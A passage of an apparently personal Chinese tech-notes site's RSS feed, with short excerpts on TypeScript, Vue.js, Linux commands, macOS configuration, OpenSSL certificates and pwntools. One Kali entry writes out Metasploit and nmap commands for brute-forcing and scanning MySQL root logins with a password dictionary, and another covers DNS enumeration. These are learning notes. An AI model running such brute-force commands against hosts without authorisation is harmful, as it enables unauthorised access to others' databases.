interface RunOptions { program:string; commandline:string[]|string|(()=&amp;gt;string); } 在 Interface 中定义方法：
interface IEmployee { getSalary: (number) =&amp;gt; number; // arrow function getManagerName(number): string; } Interface 可以定义方法类型。
继承使用关键字 extends，单接口继承语法格式：
Child_interface_name extends super_interface_name 多接口继承语法格式：
Child_interface_name extends super_interface1_name, super_interface2_name,…,super_interfaceN_name 类 # 定义类的关键字为 class，后面紧跟类名，类可以包含以下几个模块（类的数据成员）：
字段：字段是类里面声明的变量。字段表示对象的有关数据。 构造函数：类实例化时调用，可以为类的对象分配内存。 方法：方法为对象要执行的操作。 比如：
class Car { // 字段 engine:string; // 构造函数 constructor(engine:string) { this.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/5.%E6%A8%A1%E5%9D%97/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/5.%E6%A8%A1%E5%9D%97/</guid><description>模块 # 导出模块 # 模块导出使用关键字 export 关键字，语法格式如下：
// SomeInterface.ts export interface SomeInterface { // 代码部分 } 要在另外一个文件使用该模块就需要使用 import 关键字来导入:
import someInterfaceRef = require(&amp;#34;./SomeInterface&amp;#34;); 声明文件 # 常见到的 .d.ts 结尾的文件就是声明文件。
在这个文件中使用 export module 语法或者 export namespace 语法，在项目的其他地方进行引用时，就可以不需要引用完整路径进行引用，比如：
// dec.d.ts declare module &amp;#34;Dec&amp;#34; // ref.ts import * as des from &amp;#34;Dec&amp;#34;; TypeScript 作为 JavaScript 的超集，在开发过程中不可避免要引用其他第三方的 JavaScript 的库。虽然通过直接引用可以调用库的类和方法，但是却无法使用TypeScript 诸如类型检查等特性功能。
为了解决这个问题，需要将这些库里的函数和方法体去掉后只保留导出类型声明，而产生了一个描述 JavaScript 库和模块信息的声明文件。通过引用这个声明文件，就可以借用 TypeScript 的各种特性来使用库文件了。
比如使用 jQuery，我们需要使用 declare 关键字来定义它的类型，帮助 TypeScript 判断我们传入的参数类型对不对：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/vuejs/%E5%9F%BA%E7%A1%80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/vuejs/%E5%9F%BA%E7%A1%80/</guid><description>基础 # 介绍 # 起步 HelloWorld # 最简单的方式是可以使用以下的例子：
&amp;lt;script src=&amp;#34;https://unpkg.com/vue&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt; &amp;lt;p&amp;gt;{{ message }}&amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt; new Vue({ el: &amp;#39;#app&amp;#39;, data: { message: &amp;#39;Hello Vue.js!&amp;#39; } }) 声明式渲染 # 数据和 DOM 建立的连接都是响应式的 → 打开浏览器的 JavaScript 控制台，修改 app.message 的值，DOM 的内容会立即响应。除了绑定文本，我们还可以像如下方式绑定元素特性：
&amp;lt;div id=&amp;#34;app-2&amp;#34;&amp;gt; &amp;lt;span v-bind:title=&amp;#34;message&amp;#34;&amp;gt; 鼠标悬停几秒钟查看此处动态绑定的信息。 &amp;lt;/span&amp;gt; &amp;lt;/div&amp;gt; var app2 = new Vue({ el: &amp;#34;#app-2&amp;#34; data: { message: &amp;#34;页面加载于&amp;#34; + new Data().</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/mysql%E7%88%86%E7%A0%B4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/mysql%E7%88%86%E7%A0%B4/</guid><description>​ 学习地址：
https://xz.aliyun.com/t/1652 MYSQL 爆破 # 使用 metasploit # 启动 metasploit：
$ msfconsole 使用 auxiliary/scanner/mysql/mysql_login 模块进行：
可以单一扫描验证登录验证：
use auxiliary/scanner/mysql/mysql_login set rhosts &amp;lt;ip-address&amp;gt; set username root set password 11111111 run 使用某个字典进行爆破：
use auxiliary/scanner/mysql/mysql_login set RHOSTS &amp;lt;ip-address&amp;gt; set pass_file “/root/top10000pwd.txt” set username root run nmap 扫描 # 可以查看所有与 mysql 相关的脚本：
$ ls -al /usr/share/nmap/scripts/mysql* 先查看是否开启了端口
$ nmap &amp;lt;ip-address&amp;gt; 扫描空口令：
$ nmap -p3306 --script=mysql-empty-password.nse 192.168.137.130 扫描已知口令：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid><description>学习途径：
https://bbs.pediy.com/thread-215178.htm 信息收集 # 到最后还是 nmap 最好用。
DNS 域名解析 # 解析一个域名的 IP 地址：
$ host www.example.com 或者使用以下的方式详细列举包括 DNS 服务器的信息：
$ nslookup www.example.com 使用以下命令列举 DNS 请求的详细信息：
$ dig www.example.com 枚举子域名：
$ dnsmap example.com 服务枚举 # 我们将要研究 DNS 枚举和 SNMP 枚举技术。
DNS 枚举 # DNS 枚举是定位某个组织的所有 DNS 服务器和 DNS 条目的过程。DNS 枚举允许我们收集有关该组织的重要信息，例如用户名、计算机名称、IP 地址以及其它。为了完成这些任务我们会使用 DNSenum。
我们可以使用以下的命令进行 DNS 枚举：
$ dnsenum --enum &amp;lt;domain-name&amp;gt; 我们可以使用一些额外的选项来运行 DNSenum，它们包括这些东西：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/kali/%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0/</guid><description>漏洞评估 # Nessus # 使用 Nessus 这个工具，使用教程：https://cloud.tencent.com/developer/article/1076409
发现本地漏洞 # 发现网络漏洞 # 在 Policies → Add → Web Application 中选择 Web Application Tests 新建一个自己的 Policies。 在 My Scan → New Scan 中通过之前定义的 Policies 定义一个新的 Scan 在 My Scan 界面启动新的 Scan OpenVAS # OpenVAS，即开放漏洞评估系统，是一个用于评估目标漏洞的杰出框架。它是 Nessus 项目的分支。不像 Nessus，OpenVAS提供了完全免费的版本。由于 OpenVAS 在Kali Linux中成为标准，我们将会以配置开始。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/awk/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/awk/</guid><description>Awk # Brief Introduction # 学习网址：https://www.tecmint.com/use-linux-awk-command-to-filter-text-string-in-files/
The general syntax of awk is:
$ awk &amp;#39;script&amp;#39; filename # &amp;#39;script&amp;#39; format =&amp;gt; &amp;#39;/pattern/ action&amp;#39; Where 'script' is a set of commands that are understood by awk and execute on file, filename.
It works by reading a given line in the file, makes a copy of the line and then executes the script on the line. This is repeated on all the lines in the file.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/command/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/command/</guid><description>Question: How to check if a program exists from a Bash script?
Answer: three possible method:
POSIX compatible:
$ command -v &amp;lt;the_command&amp;gt; For bash specific environments:
$ hash &amp;lt;the_command&amp;gt; # For regular commands. Or... $ type &amp;lt;the_command&amp;gt; # To check built-ins and keywords Many operating systems have a which that doesn&amp;rsquo;t even set an exit status, meaning the if which foo won&amp;rsquo;t even work there and will always report that foo exists, even if it doesn&amp;rsquo;t (note that some POSIX shells appear to do this for hash too).</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/crontab/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/crontab/</guid><description>学习网址：
https://www.marksanborn.net/linux/learning-cron-by-example/ http://www.unixgeeks.org/security/newbie/unix/cron-1.html CRON # If you are using a Linux system and want to schedule a task to run in the future you will probably need to know cron. Cron is much like Window’s Scheduled Tasks. The only difference is that cron is conifgured by a simple text file.
Now obviously cron is very dependent and sensitive to the time. If you want accurate results from cron you are going to want to setup your computer to sync its clock via NTP.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/du/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/du/</guid><description>du # 用于计算文件或文件夹大小的命令，若要计算一个文件夹的大小：
$ du -h &amp;lt;your-folder&amp;gt; 若要只显示一个文件夹大小的总和：
$ du -hcs &amp;lt;your-folder&amp;gt;</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/fold/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/fold/</guid><description>Fold # fold:
manual:
Usage: fold [OPTION]&amp;hellip; [FILE]&amp;hellip; Wrap input lines in each FILE, writing to standard output.
example:
$ echo &amp;#34;Hello&amp;#34; &amp;gt; t1 $ echo &amp;#34;World&amp;#34; &amp;gt; t2 $ fold t1 t2 Hello World</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/gdb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/gdb/</guid><description>gdb # Quick Manual # 常用命令:
列出程序中的所有变量名（gdb）：
(gdb) info variables 列出程序中的所有函数名（gdb）：
(gdb) info functions 列出一个函数的汇编代码（gdb）：
(gdb) disas main 查看指定地址内的字符串（gdb）：
(gdb) x /s &amp;lt;memory_address&amp;gt; 查看各个程序段的读写执行权限（gdb：gef 插件或 peda 插件都支持）
(gdb-peda) vmmap 查看堆的信息以及按结构解析堆：
(gdb-peda) heapinfo (gdb-peda) parseheap PEDA # 插件 PEDA（Python Exploit Development Assistance for GDB）
使用以下命令安装：
$ git clone https://github.com/longld/peda $ echo &amp;#34;souce `pwd`/peda/peda.py&amp;#34; &amp;gt;&amp;gt; ~/.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/grep/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/grep/</guid><description>grep # Example # https://stackoverflow.com/questions/16956810/how-do-i-find-all-files-containing-specific-text-on-linux
Find all files containing specific text:
$ grep -rnw &amp;#39;/path/to/somewhere/&amp;#39; -e &amp;#39;pattern&amp;#39; -r or -R is recursive, -n is line number, and -w stands for match the whole word. -l (lower-case L) can be added to just give the file name of matching files. Along with these, --exclude, --include, --exclude-dir flags could be used for efficient searching:
This will only search through those files which have .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/iptables/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/iptables/</guid><description>学习网址：
https://www.jianshu.com/p/c2aee2ff7bd8 https://www.jianshu.com/p/62028875d53e 一个关于转发的教程：
https://www.91yun.co/archives/3042 iptables 防火墙 # 用于实现Linux下访问控制的功能的，它分为硬件的或者软件的防火墙两种。无论是在哪个网络中，防火墙工作的地方一定是在网络的边缘。
工作机制 # iptables 是工作在用户空间中，定义规则的工具，本身并不算是防火墙。
它定义的规则，可以让在内核空间当中的 netfilter 来读取，并且实现让防火墙工作。所以这些规则放入内核的地方必须要是特定的位置，必须是 tcp/ip 的协议栈经过的地方，这个 tcp/ip 协议栈必须经过且可以实现读取规则的地方就叫做 netfilter（网络过滤器）。这些特定的位置包括：
内核空间中：从一个网络接口进来，到另一个网络接口去的位置 数据包从内核流入用户空间的位置 数据包从用户空间流出的位置 进入/离开本机的外网接口 进入/离开本机的内网接口 由上我们知道了 iptables 选择了 5 个位置来作为控制的地方。
但是你有没有发现，其实前三个位置已经基本上能将路径彻底封锁了，但是为什么已经在进出的口设置了关卡之后还要在内部卡呢？ 由于数据包尚未进行路由决策，还不知道数据要走向哪里，所以在进出口是没办法实现数据过滤的。所以要在内核空间里设置转发的关卡，进入用户空间的关卡，从用户空间出去的关卡。
那么，既然他们没什么用，那我们为什么还要放置他们呢？因为我们在做 NAT 和 DNAT 的时候，目标地址转换必须在路由之前转换。所以我们必须在外网而后内网的接口处进行设置关卡。
这五个位置放置了五个钩子函数（hook functions）,也叫五个规则链:
PREROUTING （路由前）
INPUT （数据包流入口）
FORWARD （转发管卡）
OUTPUT（数据包流出口）
POSTROUTING（路由后）
这是 netfilter 规定的五个规则链，任何一个数据包，只要经过本机，必将经过这五个链中的其中一个链。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/netstat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/netstat/</guid><description>学习地址：
https://linuxtechlab.com/learn-use-netstat-with-examples/ learn netstat with example.
netstat # Netstat is a command line utility that tells us about all the tcp/udp/unix socket connections on our system. It provides list of all connections that are currently established or are in waiting state. This tool is extremely useful in identifying the port numbers on which an application is working and we can also make sure if an application is working or not on the port it is supposed to work.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/patch/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/patch/</guid><description>patch # Linux 中的 patch 命令与 diff 命令是一对命令。
如果我们将 diff 命令的输出导入到一个文件中，这个文件就可以称作一个 “补丁”，利用 patch 命令就可以将变化 apply 到每一个具体的文件中。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/tmux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/tmux/</guid><description> https://www.hamvocke.com/blog/a-quick-and-easy-guide-to-tmux/</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/vim/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/vim/</guid><description>学习地址：vimtutor
vimtutor 是一个由 vim 官方提供的教程，在 bash 界面直接运行 vimtutor 即可查看。
vimtutor # Lesson 1 # 移动光标：
^
k
&amp;lt; h l &amp;gt;
j
v HINT：
h 的键位于左边，每次按下就会向左移动。 l 的键位于右边，每次按下就会向右移动。 j 键看起来很象一支尖端方向朝下的箭头。 vim 的退出：
输入 :q!&amp;lt;Enter&amp;gt; 会退出编辑器并且丢弃进入编辑器之后的所有改动。 按下 :wq&amp;lt;Enter&amp;gt;保存并退出 vim 删除光标所在位置的字符：可以按下 x 键来删除光标所在位置的字符。
插入文本：可以按下 i 键来插入字符。
添加文本：可以按下 A 键来添加文本（光标会定位到行末）
Lesson 2 # 删除类命令：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/wc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/linux-command/wc/</guid><description>学习地址：
https://www.tecmint.com/wc-command-examples/ wc # The wc(word count) command in Unix/Linux operating systems is used to find out number of newline count, word count, byte and characters count in a files specified by the file arguments.
The syntax of wc command as shown below:
$ wc [options] filenames The following are the options and usage provided by the command:
wc -l : Prints the number of lines in a file.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/macos/1.%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/macos/1.%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/</guid><description>系统配置 # 系统配置优化 # 大小写、Ctrl 键交换（我最后还是换回来了）：
添加脚本文件 ~/.macbootstrap/onlogin.sh：
hidutil property --set &amp;#39;{&amp;#34;UserKeyMapping&amp;#34;:[{&amp;#34;HIDKeyboardModifierMappingSrc&amp;#34;:0x700000039,&amp;#34;HIDKeyboardModifierMappingDst&amp;#34;:0x7000000E0},{&amp;#34;HIDKeyboardModifierMappingSrc&amp;#34;:0x7000000E0,&amp;#34;HIDKeyboardModifierMappingDst&amp;#34;:0x700000039}]}&amp;#39; 添加开启启动文件 ~/Library/LaunchAgents/com.bestsifter.onlogin.pliste：
&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE plist PUBLIC &amp;#34;-//Apple//DTD PLIST 1.0//EN&amp;#34; &amp;#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&amp;#34;&amp;gt; &amp;lt;plist version=&amp;#34;1.0&amp;#34;&amp;gt; &amp;lt;dict&amp;gt; &amp;lt;key&amp;gt;LaunchOnlyOnce&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt; &amp;lt;key&amp;gt;Label&amp;lt;/key&amp;gt; &amp;lt;string&amp;gt;com.bestswifter.onlogin&amp;lt;/string&amp;gt; &amp;lt;key&amp;gt;ProgramArguments&amp;lt;/key&amp;gt; &amp;lt;array&amp;gt; &amp;lt;string&amp;gt;zsh&amp;lt;/string&amp;gt; &amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt; &amp;lt;string&amp;gt;&amp;#34;$HOME/.macbootstrap/onlogin.sh&amp;#34;&amp;lt;/string&amp;gt; &amp;lt;/array&amp;gt; &amp;lt;key&amp;gt;KeepAlive&amp;lt;/key&amp;gt; &amp;lt;true/&amp;gt; &amp;lt;/dict&amp;gt; &amp;lt;/plist&amp;gt; 然后在命令行中执行下面的命令：
sudo launchctl load ~/Library/LaunchAgents/com.bestswifter.onlogin.plist 触摸板优化。只需要轻触触摸板而不需要点击（开启之后好像没有立即生效我也不知道为什么）：
defaults write com.apple.AppleMultitouchTrackpad Clicking -int 1 defaults -currentHost write NSGlobalDomain com.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/macos/2.mac%E5%B7%A5%E4%BD%9C%E6%B5%81/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/macos/2.mac%E5%B7%A5%E4%BD%9C%E6%B5%81/</guid><description>Mac 工作流 # 邮件 # Mac OS 自带的邮箱系统可以通过模式匹配对邮件进行一些操作。
item2 # 一个终端软件（这个我没装，花里胡哨的，跟 hyper、cmder 这些应该差不大）；
SSH 配置 # 跟 Linux 下的差不多。
这里写的一些 ssh 全局配置还是比较有用的：
Host * ForwardAgent yes ServerAliveInterval 10 ServerAliveCountMax 10000 TCPKeepAlive no ControlMaster auto ControlPath ~/.ssh/%h-%p-%r ControlPersist 4h Compression yes 其中：
ForwardAgent 置为 YES 表示，层级 ssh 链接将使用直接链接； ServerAliveInterval 与 ServerAliveCountAlive 的设置是为了防止服务器主动切断连接，保持连接而向服务器发送心跳包，二者设置分别为心跳包的间隔时间与最大的心跳包发送次数。 ControlMaster 表示每次连接都会建立一个 socket 文件；ControlPath 表示这个 socket 的位置；ControlPersist 表示这个文件会存在四个小时。进行这个设置可以加快下次的连接。 科学上网 # 根据不同的需求，Mac OS 中科学上网，主要用到下面的几个工具：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/1.aboutcsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/1.aboutcsr/</guid><description>About Certificate Signing Requests (CSRs) # graph TB;
subgraph Client;
F{Infomation};
PK1(&amp;#34;PrivateKey(*.key)&amp;#34;); PK2(&amp;#34;PublicKey(*.pub)&amp;#34;); DN(&amp;#34;DistinguisedName(DN)&amp;#34;)
CSR(&amp;#34;CertificateSigningRequest(*.csr)&amp;#34;)
F---PK1; F---PK2; F---DN;
PK2--&amp;gt;CSR; DN--&amp;gt;CSR
CRTclient(&amp;#34;ClientCertificate(*.crt)&amp;#34;)
end
subgraph CAroot;
CRTroot(&amp;#34;CACertificate(*.crt)&amp;#34;)
end
CSR--&amp;gt;|request|CRTroot
CRTroot--&amp;gt;|sign|CRTclient If you would like to obtain an SSL certificate from a certificate authority (CA), you must generate a certificate signing request (CSR). A CSR consists mainly of the public key of a key pair, and some additional information.
Whenever you generate a CSR, you will be prompted to provide information regarding the certificate.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/2.generatecsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/2.generatecsr/</guid><description>Generating CSRs # Generate a private key and a CSR # This command creates a 2048-bit private key (domain.key) and a CSR (domain.csr) from scratch:
$ openssl req \ -newkey rsa:2048 -nodes -keyout domain.key \ -out domain.csr The -newkey rsa:2048 option specifies that the key should be 2048-bit, generated using the RSA algorithm.
The -nodes option specifies that the private key should not be encrypted with a pass phrase.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/3.generatessl/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/3.generatessl/</guid><description>Generating SSL Certificates # If you would like to use an SSL certificate to secure a service but you do not require a CA-signed certificate, a valid (and free) solution is to sign your own certificates.
A common type of certificate that you can issue yourself is a self-signed certificate. Therefore, self-signed certificates should only be used if you do not need to prove your service&amp;rsquo;s identity to its users (e.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/4.viewcertificate/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/4.viewcertificate/</guid><description>View Certificates # CSR Entries # This command allows you to view and verify the contents of a CSR (domain.csr) in plain text:
$ openssl req -text -noout -verify -in domain.csr Certificate Entries # This command allows you to view the contents of a certificate (domain.crt) in plain text:
$ openssl x509 -text -noout -in domain.crt Verify a Certificate was Signed by a CA # Use this command to verify that a certificate (domain.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/5.privatekey/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/5.privatekey/</guid><description>Private Key # Create a Private Key # Use this command to create a password-protected, 2048-bit private key (domain.key):
$ openssl genrsa -des3 -out domain.key 2048 Verify a Private Key # Use this command to check that a private key (domain.key) is a valid key:
$ openssl rsa -check -in domain.key Verify a Private Key Matches a Certificate and CSR # Use these commands to verify if a private key (domain.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/6.convertformats/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/openssl/6.convertformats/</guid><description>Convert Formats # All of the certificates that we have been working with have been X.509 certificates that are ASCII PEM encoded.
OpenSSL can be used to convert certificates to and from a large variety of these formats. This section will cover a some of the possible conversions.
Convert PEM to DER # Use this command if you want to convert a PEM-encoded certificate (domain.crt) to a DER-encoded certificate (domain.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/pwntools/1.gettingstarted/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/pwntools/1.gettingstarted/</guid><description>学习网址：http://docs.pwntools.com/en/stable/intro.html
Getting Started # from pwn import * This imports a lot of functionality into the global namespace. You can now assemble, disassemble, pack, unpack, and many other things with a single function.
A full list of everything that is imported is available on from pwn import
Making Connections # Pwntools talk to the challenge binary in order with its pwnlib.tubes module.
Remote connect # pwnlib.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/pwntools/%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/pwntools/%E6%96%B0%E6%89%8B%E6%95%99%E7%A8%8B/</guid><description>学习网址：
https://bbs.pediy.com/thread-247217.htm pwntools 新手教程 # Hello World # C 程序源代码（./1.c）：
